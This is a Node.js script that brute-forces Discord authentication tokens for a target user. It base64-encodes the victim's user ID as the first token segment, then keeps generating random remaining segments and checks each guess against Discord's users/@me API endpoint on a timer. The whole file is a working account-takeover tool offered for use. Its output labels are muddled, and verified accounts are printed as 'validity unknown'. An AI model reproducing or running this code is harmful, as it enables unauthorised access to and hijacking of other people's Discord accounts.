const request = require("request");
const fs = require("fs");
const askme = require('readline-sync');
const term = require("terminal-kit").terminal;

const config = require('./config.json');


var invalid = [];
var verified = [];
var unverified = [];

function maketoken(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function ask() {
    console.log("\n")
    term.brightBlue(`Enter 1 to start brute forcing account right away with ID\n`);
    term.brightBlue(`Enter 2 to resolve user's ID and return\n`);
    term.brightBlue(`Enter 3 (filler)\n`);
    term.brightBlue(`Enter 4 (filler)\n`);
    term.brightBlue(`Enter 5 (filler)\n`);
    sel = askme.question("Enter option here: ");

    if (sel == 1) {
        id = askme.question("Enter user's ID here: ");
        let iddecrypt = Buffer.from(id).toString('base64')
        var settings = {
            timeout: config.timeout,
            do_not_touch: iddecrypt
        };
        fs.writeFileSync(__dirname + '/config.json', JSON.stringify(settings, null, 2));
        setInterval(() => {
            check();
        }, config.timeout);
    }
    if (sel == 2) {
        id = askme.question("Enter user's ID here: ");
        let iddecrypt = Buffer.from(id).toString('base64')
        console.log(iddecrypt)

    }
    if (sel == 3) {

    }
    if (sel == 4) {

    }
    if (sel == 5) {

    }
}

function check() {
    var token1 = config.do_not_touch
    var token2 = maketoken(6)
    var token3 = maketoken(27)
    var fulltoken = token1 + '.' + token2 + '.' + token3
    
    request({
        method: "GET",
        url: "https://discordapp.com/api/v7/users/@me",
        headers: {
            authorization: fulltoken
        }
    }, (error, response, body) => {
        if (!body) return;
        var json = JSON.parse(body);
        if (!json.id) {
            invalid.push(fulltoken);
            term.brightRed(fulltoken + " is invalid...\n"), (err) => {
                if (err) throw err;
            };
        } else if (!json.verified) {
            unverified.push(fulltoken);
            term.brightGreen(fulltoken + " is valid!\n"), (err) => {

                if (err) throw err;
            };
        } else {
            verified.push(fulltoken);
            term.brightYellow(fulltoken + " the validity of this token is unknown :/\n"), (err) => {
                if (err) throw err;
            };
        }

    });
}




ask();